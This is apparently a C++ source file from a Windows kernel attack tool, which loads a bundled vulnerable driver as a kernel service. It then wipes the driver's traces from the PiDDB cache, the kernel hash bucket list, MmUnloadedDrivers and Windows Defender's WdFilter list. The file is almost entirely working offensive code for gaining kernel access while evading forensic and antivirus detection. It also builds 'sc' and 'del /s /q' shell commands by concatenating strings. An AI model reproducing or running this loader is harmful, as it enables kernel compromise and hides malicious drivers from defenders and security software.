#include "vulndriver.h"
#include "utils.h"
#define STATUS_UNSUCCESSFUL              ((NTSTATUS)0xC0000001L)
#define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L)    // ntsubauth


NTSTATUS VulnurableService::UnloadVulnurableDriver(HANDLE* VulnHandle, char VulnDriverPath[], const char* ServiceName) {
	if (*VulnHandle != 0 && *VulnHandle != INVALID_HANDLE_VALUE) {
		CloseHandle(*VulnHandle);
	}
	char StopCommand[MAX_PATH] = "sc stop ";
	strcat_s(StopCommand, ServiceName);
	char DeleteCommand[MAX_PATH] = "sc delete ";
	strcat_s(DeleteCommand, ServiceName);
	char UnloadingCommand[1024] = "del /s /q ";
	strcat_s(UnloadingCommand, VulnDriverPath);
	system(StopCommand);
	system(DeleteCommand);
	if (system(UnloadingCommand) == -1) {
		return STATUS_UNSUCCESSFUL;
	}

	return STATUS_SUCCESS;
}


NTSTATUS VulnurableService::RegisterVulnurableDriver(char VulnDriverPath[], const char* ServiceName) {
	char StopCommand[MAX_PATH] = "sc stop ";
	strcat_s(StopCommand, ServiceName);
	char DeleteCommand[MAX_PATH] = "sc delete ";
	strcat_s(DeleteCommand, ServiceName);
	char RegistrationCommand[1024] = "sc create ";
	strcat_s(RegistrationCommand, ServiceName);
	strcat_s(RegistrationCommand, " type=kernel start=demand binPath=");
	strcat_s(RegistrationCommand, VulnDriverPath);
	system(StopCommand);
	system(DeleteCommand);
	if (system(RegistrationCommand) == -1) {
		return STATUS_UNSUCCESSFUL;
	}
	return STATUS_SUCCESS;
}


NTSTATUS VulnurableService::StartVulnurableDriver(const char* ServiceName) {
	char StartCommand[MAX_PATH] = "sc start ";
	strcat_s(StartCommand, ServiceName);
	if (system(StartCommand) == -1) {
		return STATUS_UNSUCCESSFUL;
	}
	return STATUS_SUCCESS;
}


NTSTATUS VulnurableDriver::LoadVulnurableDriver(HANDLE* VulnHandle, LPCWSTR VulnDriverName, const char* SymbolicLink, const char* ServiceName, const BYTE DriverData[], ULONG DriverTimestamp, PVOID* MainKernelBase, ULONG64 VulnSize) {
	DWORD Status = 0;
	char VulnDriverPath[MAX_PATH] = { 0 };
	WCHAR WideVulnDriverPath[MAX_PATH] = { 0 };
	PVOID KernelBaseAddress = NULL;
	std::wstring BackSlash(L"\\");
	std::wstring VulnName(BackSlash + VulnDriverName);
	PVOID ActualPiDDBLock = NULL;
	nt::PRTL_AVL_TABLE ActualPiDDBTable = NULL;
	PVOID ActualHashTableLock = NULL;
	PVOID ActualHashTableList = NULL;
	PVOID ActualWdFilterList = NULL;
	PVOID ActualWdFilterCount = NULL;
	PVOID ActualFreeDriverInfo = NULL;
	char StopCommand[MAX_PATH] = "sc stop ";
	strcat_s(StopCommand, ServiceName);
	char DeleteCommand[MAX_PATH] = "sc delete ";
	strcat_s(DeleteCommand, ServiceName);
	char UnloadingCommand[1024] = "del /s /q ";
	general::GetCurrentPathRegular(VulnDriverPath, VulnName);
	general::CharpToWcharp(VulnDriverPath, WideVulnDriverPath);
	strcat_s(UnloadingCommand, VulnDriverPath);


	// Delete remaining data:
	system(StopCommand);
	system(DeleteCommand);
	if (system(UnloadingCommand) == -1) {
		return STATUS_UNSUCCESSFUL;
	}


	// Check if driver is still active:
	if (VulnurableDriver::HelperFunctions::IsAlreadyRunning(SymbolicLink)) {
		return ERROR_ALREADY_EXISTS;
	}
	wprintf(L"[i] Loading vulnurable driver %s from full path %s\n", VulnDriverName, WideVulnDriverPath);


	// Get the vulnurable driver in a file from the memory data:
	Status = specific::MemoryToFile(WideVulnDriverPath, (BYTE*)DriverData, VulnSize);
	if (Status != 0) {
		wprintf(L"[-] Failed to load vulnurable driver data into a file (%s): %d\n", VulnDriverName, Status);
		return Status;
	}

	
	// Register the vulnurable driver as a service and start the service:
	if (VulnurableService::RegisterVulnurableDriver(VulnDriverPath, ServiceName) == STATUS_UNSUCCESSFUL) {
		printf("[-] Failed to register the vulnurable driver as a service: %d\n", GetLastError());
		return STATUS_UNSUCCESSFUL;
	}
	if (VulnurableService::StartVulnurableDriver(ServiceName) == STATUS_UNSUCCESSFUL) {
		printf("[-] Failed to start the vulnurable driver service: %d\n", GetLastError());
		return STATUS_UNSUCCESSFUL;
	}
	

	// Check if driver was loaded correctly by trying to get a handle with the symbolic link:
	*VulnHandle = CreateFileA(SymbolicLink, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (*VulnHandle == INVALID_HANDLE_VALUE){
		printf("[-] Failed to load vulnurable driver (handle = NULL/INVALID_HANDLE_VALUE): %d\n", GetLastError());
		VulnurableService::UnloadVulnurableDriver(VulnHandle, VulnDriverPath, ServiceName);
		return STATUS_UNSUCCESSFUL;
	}


	// Get base of kernel:
	KernelBaseAddress = specific::GetKernelModuleAddress("ntoskrnl.exe");
	if (KernelBaseAddress == NULL) {
		printf("[-] Failed to get the base address of the kernel system module (ntoskrnl.exe): %d\n", GetLastError());
		VulnurableService::UnloadVulnurableDriver(VulnHandle, VulnDriverPath, ServiceName);
		return STATUS_UNSUCCESSFUL;
	}
	if (MainKernelBase != NULL) {
		*MainKernelBase = KernelBaseAddress;
	}


	// Clear the remainers of the vulnurable driver from the PiDDB table:
	if (!NT_SUCCESS(VulnurableDriver::PersistenceFunctions::CleanPiDDBCacheTable(VulnHandle, KernelBaseAddress, VulnDriverName, &ActualPiDDBLock, &ActualPiDDBTable, DriverTimestamp))) {
		printf("[-] Failed to clear driver entry from PiDDB table: %d\n", GetLastError());
		VulnurableService::UnloadVulnurableDriver(VulnHandle, VulnDriverPath, ServiceName);
		return STATUS_UNSUCCESSFUL;
	}


	// Clear the remainers of the vulnurable driver from the HashBucketList:
	if (!NT_SUCCESS(VulnurableDriver::PersistenceFunctions::CleanKernelHashBucketList(VulnHandle, KernelBaseAddress, &ActualHashTableList, &ActualHashTableLock, VulnDriverName, WideVulnDriverPath))) {
		printf("[-] Failed to clear driver entry from HashBucketList: %d\n", GetLastError());
		VulnurableService::UnloadVulnurableDriver(VulnHandle, VulnDriverPath, ServiceName);
		return STATUS_UNSUCCESSFUL;
	}


	// Clear the remainers of the vulnurable driver from MmUnloadedDrivers:
	if (!VulnurableDriver::PersistenceFunctions::CleanMmUnloadedDrivers(VulnHandle, KernelBaseAddress, VulnDriverName)) {
		printf("[-] Failed to clear driver entry from MmUnloadedDrivers: %d\n", GetLastError());
		VulnurableService::UnloadVulnurableDriver(VulnHandle, VulnDriverPath, ServiceName);
		return STATUS_UNSUCCESSFUL;
	}


	// Clear the remainers of the vulnurable driver from WdFilter list:
	if (!NT_SUCCESS(VulnurableDriver::PersistenceFunctions::CleanWdFilterDriverList(VulnHandle, KernelBaseAddress, VulnDriverName, &ActualWdFilterList, &ActualWdFilterCount, &ActualFreeDriverInfo))) {
		printf("[-] Failed to clear driver entry from WdFilter list: %d\n", GetLastError());
		VulnurableService::UnloadVulnurableDriver(VulnHandle, VulnDriverPath, ServiceName);
		return STATUS_UNSUCCESSFUL;
	}
	return STATUS_SUCCESS;
}